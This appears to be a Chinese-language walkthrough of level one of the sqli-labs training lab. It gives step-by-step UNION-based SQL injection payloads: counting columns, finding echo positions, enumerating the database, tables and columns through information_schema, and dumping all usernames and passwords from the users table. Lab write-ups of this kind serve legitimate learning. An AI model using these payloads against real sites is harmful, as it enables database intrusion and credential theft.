sqli-labs第一题

根据提示让我们输入id参数,/?id=1,然后根据判断是字符型注入

然后 order by猜列数，有3列，?id=1 order by 3

使用union联合查询判断回显位置,?id=0’ union select 1,2,3–+，判断出回显位为2，3

接下来就是在回显位猜库名表名，?id=0’ union select 1,database(),3–+，获取库名为security

**?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()–+**，

获取表名为emails，referers，uagents，users的四个表

**?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+ **

获取users表的所有字段名

?id=0’ union select 1,group_concat(username),group_concat(password) from security.users,

查询所有用户名和密码
